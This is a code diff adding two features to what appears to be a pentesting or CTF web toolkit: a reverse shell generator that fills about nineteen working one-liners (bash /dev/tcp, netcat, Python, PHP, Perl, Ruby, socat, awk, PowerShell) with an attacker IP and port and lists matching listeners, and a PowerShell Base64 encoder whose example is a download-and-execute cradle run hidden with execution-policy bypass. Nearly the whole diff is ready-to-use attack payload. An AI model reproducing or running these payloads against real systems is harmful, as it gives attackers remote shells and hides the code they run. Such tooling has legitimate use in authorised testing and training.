@@ -3309,6 +3309,122 @@ TOOLS['notationer'] = {
   }
 };
 
+// ===== REVERSE SHELL GENERATOR =====
+const REVSHELLS = [
+  ['Bash -i',        (ip,port,sh)=>`${sh} -i >& /dev/tcp/${ip}/${port} 0>&1`],
+  ['Bash 196',       (ip,port,sh)=>`0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${sh} <&196 >&196 2>&196`],
+  ['Bash read line', (ip,port,sh)=>`exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`],
+  ['Bash 5',         (ip,port,sh)=>`${sh} -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`],
+  ['nc mkfifo',      (ip,port,sh)=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`],
+  ['nc -e',          (ip,port,sh)=>`nc ${ip} ${port} -e ${sh}`],
+  ['nc -c',          (ip,port,sh)=>`nc -c ${sh} ${ip} ${port}`],
+  ['ncat -e',        (ip,port,sh)=>`ncat ${ip} ${port} -e ${sh}`],
+  ['ncat mkfifo',    (ip,port,sh)=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${sh} -i 2>&1|ncat ${ip} ${port} >/tmp/f`],
+  ['Python3',        (ip,port,sh)=>`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("${sh}")'`],
+  ['Python3 short',  (ip,port,sh)=>`export RHOST="${ip}";export RPORT=${port};python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${sh}")'`],
+  ['PHP exec',       (ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});exec("${sh} <&3 >&3 2>&3");'`],
+  ['PHP system',     (ip,port,sh)=>`php -r '$sock=fsockopen("${ip}",${port});system("${sh} <&3 >&3 2>&3");'`],
+  ['Perl',           (ip,port,sh)=>`perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");};'`],
+  ['Ruby',           (ip,port,sh)=>`ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${sh} -i <&%d >&%d 2>&%d",f,f,f)'`],
+  ['socat',          (ip,port,sh)=>`socat TCP:${ip}:${port} EXEC:${sh}`],
+  ['socat (TTY)',    (ip,port,sh)=>`socat TCP:${ip}:${port} EXEC:'${sh}',pty,stderr,setsid,sigint,sane`],
+  ['awk',            (ip,port,sh)=>`awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`],
+  ['PowerShell',     (ip,port,sh)=>`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`],
+];
+TOOLS['revshell'] = {
+  title: 'Reverse Shell Generator',
+  desc: 'Generate reverse shell one-liners for many languages and tools',
+  render() {
+    const shells = ['/bin/bash','/bin/sh','/bin/zsh','/bin/dash','cmd','powershell'];
+    return `
+      <div class="tool">
+        <div class="card">
+          <div class="card-title">Configuration</div>
+          <div class="field-row-3">
+            <div class="field"><label>IP (LHOST)</label><input type="text" id="rs-ip" value="10.10.14.1"></div>
+            <div class="field"><label>Port (LPORT)</label><input type="text" id="rs-port" value="4444"></div>
+            <div class="field"><label>Shell</label><select id="rs-shell">${shells.map(s=>`<option>${s}</option>`).join('')}</select></div>
+          </div>
+          <div class="field"><label>Payload</label><select id="rs-type">${REVSHELLS.map((r,i)=>`<option value="${i}">${escapeHtml(r[0])}</option>`).join('')}</select></div>
+        </div>
+        <div class="card">
+          <div class="result-header"><h4 id="rs-name"></h4><button class="btn btn-ghost" id="rs-copy">Copy</button></div>
+          <pre class="not-pre mono" id="rs-out"></pre>
+        </div>
+        <div class="card">
+          <div class="result-header"><h4>Listeners</h4><button class="btn btn-ghost" id="rs-copy-l">Copy</button></div>
+          <pre class="not-pre mono" id="rs-listeners"></pre>
+        </div>
+      </div>`;
+  },
+  init() {
+    const upd = () => {
+      const ip = $('#rs-ip').value.trim() || 'LHOST';
+      const port = $('#rs-port').value.trim() || 'LPORT';
+      const sh = $('#rs-shell').value;
+      const [name, fn] = REVSHELLS[+$('#rs-type').value];
+      $('#rs-name').textContent = name;
+      $('#rs-out').textContent = fn(ip, port, sh);
+      $('#rs-listeners').textContent = [
+        `nc -lvnp ${port}`,
+        `ncat -lvnp ${port}`,
+        `ncat --ssl -lvnp ${port}`,
+        `socat -d -d TCP-LISTEN:${port} STDOUT`,
+        `rlwrap -cAr nc -lvnp ${port}`,
+        `msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; run"`,
+      ].join('\n');
+    };
+    ['rs-ip','rs-port','rs-shell','rs-type'].forEach(id => { const el = $('#'+id); el.addEventListener('input', upd); el.addEventListener('change', upd); });
+    $('#rs-copy').addEventListener('click', () => copy($('#rs-out').textContent));
+    $('#rs-copy-l').addEventListener('click', () => copy($('#rs-listeners').textContent));
+    upd();
+  }
+};
+
+// ===== POWERSHELL ENCODER (-EncodedCommand, Base64 UTF-16LE) =====
+TOOLS['ps-encode'] = {
+  title: 'PowerShell Encoder',
+  desc: 'Encode a PowerShell command to -EncodedCommand (Base64, UTF-16LE)',
+  render() {
+    return `
+      <div class="tool">
+        <div class="card">
+          <div class="card-title">PowerShell Command</div>
+          <div class="field">
+            <label>Command to encode</label>
+            <textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>
+          </div>
+        </div>
+        <div class="card">
+          <div class="result-header"><h4>EncodedCommand (Base64, UTF-16LE)</h4><button class="btn btn-ghost" id="pe-copy-b64">Copy</button></div>
+          <pre class="not-pre mono" id="pe-b64"></pre>
+        </div>
+        <div class="card">
+          <div class="result-header"><h4>Full command</h4><button class="btn btn-ghost" id="pe-copy-full">Copy</button></div>
+          <pre class="not-pre mono" id="pe-full"></pre>
+        </div>
+      </div>`;
+  },
+  init() {
+    const enc = (s) => {
+      let bin = '';
+      for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); bin += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff); }
+      return btoa(bin);
+    };
+    const upd = () => {
+      const cmd = $('#pe-in').value;
+      if (!cmd) { $('#pe-b64').textContent = ''; $('#pe-full').textContent = ''; return; }
+      const b64 = enc(cmd);
+      $('#pe-b64').textContent = b64;
+      $('#pe-full').textContent = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ' + b64;
+    };
+    $('#pe-in').addEventListener('input', upd);
+    $('#pe-copy-b64').addEventListener('click', () => copy($('#pe-b64').textContent));
+    $('#pe-copy-full').addEventListener('click', () => copy($('#pe-full').textContent));
+    upd();
+  }
+};
+
 // ============================================================
 // NAVIGATION
 // ============================================================
